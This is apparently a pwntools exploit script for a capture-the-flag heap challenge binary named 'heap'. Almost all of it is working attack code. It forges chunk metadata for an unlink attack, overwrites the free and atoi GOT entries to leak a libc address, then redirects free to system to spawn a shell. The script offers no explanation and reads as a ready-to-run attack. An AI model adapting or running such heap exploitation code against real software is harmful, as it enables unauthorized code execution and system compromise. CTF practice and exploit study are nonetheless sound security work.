from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./heap")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./heap")
else:
	pass

def add(size,content,large=True):
	p.sendafter("> ","1")
	if large:
		p.sendafter("> ","2")
	else:
		p.sendafter("> ","1")
	p.sendlineafter("length: ",str(size))
	p.sendafter("words: ",content)

def show(large = True):
	p.sendafter("> ","4")
	if large:
		p.sendafter("> ","2")
	else:
		p.sendafter("> ","1")

def free(large = True):
	p.sendafter("> ","2")
	if large:
		p.sendafter("> \n","2")
	else:
		p.sendafter("> \n","1")

def edit(content,large = True):
	p.sendafter("> ","3")
	if large:
		p.sendafter("> ","2")
	else:
		p.sendafter("> ","1")
	p.sendafter("words: ",content)

def debugf():
	gdb.attach(p,"b *0x400E9B")

context.log_level = "debug"
context.terminal = ["tmux","splitw","-v"]
debugf()
add(0x20,"a",True)
add(0x70,"b",False)
free(True)
add(0x30,p64(0) + p64(0x31),True)
free(True)
add(0x20,"d",True)
large_addr = 0x6020B8
payload = p64(0) + p64(0x21) + p64(large_addr - 0x18) + p64(large_addr - 0x10)
payload += p64(0x20) + p64(0x70 + 0x10 + 0x10)
edit(payload,True)
free(False)
payload = p64(0)*3 + p64(elf.got["free"]) + p64(elf.got["atoi"])
edit(payload,True)
edit(p64(elf.plt["puts"]),True)
free(False)
atoi_addr = u64(p.recv(6).ljust(8,"\x00"))
libc.address = atoi_addr - libc.symbols["atoi"]
log.success("libc_base:"+hex(libc.address))
add(0x20,"/bin/sh\x00",False)
edit(p64(libc.symbols["system"]),True)
free(False)
p.interactive()
